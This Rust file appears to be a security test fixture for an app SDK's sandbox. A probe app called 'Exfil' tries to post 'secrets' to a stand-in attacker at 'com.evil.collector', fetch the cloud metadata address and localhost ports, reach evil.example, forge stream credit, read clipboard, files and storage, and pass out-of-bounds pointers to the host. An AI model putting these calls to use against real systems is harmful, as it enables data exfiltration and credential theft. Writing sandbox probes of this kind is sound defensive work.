use crate::Exfil;
use citadel_app_sdk::ihttp::{Address, Outbound, Request, ResponseWriter};
use citadel_app_sdk::types::calls::*;
use citadel_app_sdk::types::{encode, Bytes};
use citadel_app_sdk::*;
use fixture_report::{answer, code, probe, raw, reply_answer, report};

fn get(url: &str) -> HttpRequest {
    HttpRequest {
        method: HttpMethod::Get,
        url: url.into(),
        headers: vec![],
        body: Bytes::default(),
    }
}

fn sink(_: &mut Exfil, _: Request, response: ResponseWriter) {
    let _ = response.respond(200, vec![], b"exfil");
}

pub fn through_the_sdk() {
    let attacker = Address::User {
        app_id: "com.evil.collector".into(),
        username: "admin".into(),
    };
    let out = Outbound {
        method: HttpMethod::Post,
        path: "/drop".into(),
        query: String::new(),
        headers: vec![],
        body: b"secrets".to_vec(),
    };
    let _call = ihttp::Client::new(attacker, ihttp::Transport::Relay)
        .call(out, |_: &mut Exfil, r| report("ihttp_call", &answer(&r)));
    let routes = vec![Route {
        method: HttpMethod::Get,
        path: "/".into(),
    }];
    probe::<Exfil, _>(
        "ihttp_serve",
        ihttp::serve(
            routes,
            ihttp::ServeOn {
                relay: true,
                p2p: false,
            },
            sink,
        ),
    );
    // Credit for a stream it never opened, holding neither ihttp capability.
    let forged = IhttpConsumed {
        peer: Caller {
            username: "admin".into(),
            cid: 1,
            app_id: "com.evil.collector".into(),
            install_id: "i".into(),
            via: Via::Relay,
        },
        stream: 1,
    };
    probe::<Exfil, _>("ihttp_consumed", call(&forged));
    probe::<Exfil, _>(
        "net_host_agent_port",
        net::host_fetch(get("http://127.0.0.1:12345/")),
    );
    probe::<Exfil, _>(
        "net_server_metadata",
        net::server_fetch(get("http://169.254.169.254/latest/meta-data/")),
    );
    probe::<Exfil, _>(
        "net_host_stream",
        net::host_fetch_stream(get("https://evil.example/")),
    );
    probe::<Exfil, _>("storage_scope_set", storage::scope().set("steal", b"x"));
    probe::<Exfil, _>("storage_local_list", storage::local().list("", None));
    probe::<Exfil, _>("storage_blob_put", storage::blob::put(b"x"));
    probe::<Exfil, _>("storage_files_list", storage::files::list("/"));
    probe::<Exfil, _>("files_read", files::read("/", 0, 16));
    probe::<Exfil, _>("nodes_read_mdx", nodes::read_mdx("root"));
    probe::<Exfil, _>("nodes_create", nodes::create("root", "x"));
    probe::<Exfil, _>("md_replace_zone", md::replace_zone("x"));
    probe::<Exfil, _>("chat_send", chat::send("x"));
    probe::<Exfil, _>("members_list", members::list());
    probe::<Exfil, _>("clipboard_read", clipboard::read_text());
    probe::<Exfil, _>("notify", notify::notify("x", "y"));
    probe::<Exfil, _>("documents_open", documents::open("root"));
    probe::<Exfil, _>("navigate_external", navigate::open("https://evil.example/"));
}

const OUTSIDE: i32 = 0xffff_fff0_u32 as i32;

fn ptr(bytes: &[u8]) -> (i32, i32) {
    (bytes.as_ptr() as usize as i32, bytes.len() as i32)
}

pub fn at_the_boundary() {
    let line = encode(&LogWrite {
        level: LogLevel::Debug,
        message: "probe".into(),
    });
    let (lp, ll) = ptr(&line);
    let garbage = [0xffu8; 3];
    let (gp, gl) = ptr(&garbage);
    // SAFETY: every pointer is either a live slice or deliberately outside memory, which the
    // host must refuse without reading; nothing here is dereferenced by the app.
    unsafe {
        report("log_unknown_op", &reply_answer(raw::log(999, lp, ll)));
        report("log_out_of_bounds", &code(raw::log(1, OUTSIDE, 64)));
        report("log_malformed", &reply_answer(raw::log(1, gp, gl)));
        report("reply_len_forged", &code(raw::reply_len(0x7fff_0000)));

        let h = raw::log(1, lp, ll);
        let mut one = [0u8; 1];
        report(
            "reply_read_small_buffer",
            &code(raw::reply_read(h, one.as_mut_ptr() as usize as i32, 1)),
        );
        report(
            "reply_read_after_small",
            match raw::read(h) {
                Ok(_) => "ok",
                Err(_) => "lost",
            },
        );
        let mut buf = [0u8; 64];
        report(
            "reply_read_released",
            &code(raw::reply_read(h, buf.as_mut_ptr() as usize as i32, 64)),
        );

        let h = raw::log(1, lp, ll);
        let len = raw::reply_len(h);
        report(
            "reply_read_out_of_bounds",
            &code(raw::reply_read(h, OUTSIDE, len)),
        );
    }
}
